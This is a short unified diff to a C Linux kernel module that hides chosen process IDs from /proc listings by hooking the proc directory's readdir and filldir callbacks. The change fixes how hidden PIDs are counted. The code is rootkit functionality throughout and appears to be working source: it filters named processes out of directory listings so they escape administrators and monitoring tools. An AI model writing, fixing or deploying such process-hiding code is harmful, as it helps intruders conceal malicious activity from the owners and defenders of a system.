@@ -11,7 +11,7 @@
 #define MAX_PID_LEN 6
 static char pid_array[MAX_PIDC][MAX_PID_LEN];
 static int hide_pid[MAX_PIDC];
-static int pid_argc;
+static int pid_argc,pidc;
 static int is_hidden = 0;
 
 struct inode *proc_inode;
@@ -44,7 +44,7 @@ static int readdir_proc( struct file* f, void * a, filldir_t t){
 
 static int my_filldir_t (void * __buf, const char * name, int namelen, loff_t offset, u64 ino, unsigned d_type){
 	int i;
-	for(i=0; i < pid_argc; i++){
+	for(i=0; i < pidc; i++){
 		if(strcmp(pid_array[i], name) == 0){
 			return 0;
 		}
@@ -67,15 +67,16 @@ static void hide_proc_tree(){
 }
 
 void hide_process(int pid){
-	if(pid_argc < MAX_PIDC){
-		hide_pid[pid_argc] = pid;
-		snprintf(pid_array[pid_argc], MAX_PID_LEN, "%d", pid); //since we don't have itoa
+	if(pidc < MAX_PIDC){
+		hide_pid[pidc] = pid;
+		snprintf(pid_array[pidc], MAX_PID_LEN, "%d", pid); //since we don't have itoa
+		pidc++;
 	}
 }
 
 void hide_processes(){
 	int i;
-		
+	
 	for(i=0; i< pid_argc; i++){
 		hide_process(hide_pid[i]);
 	}
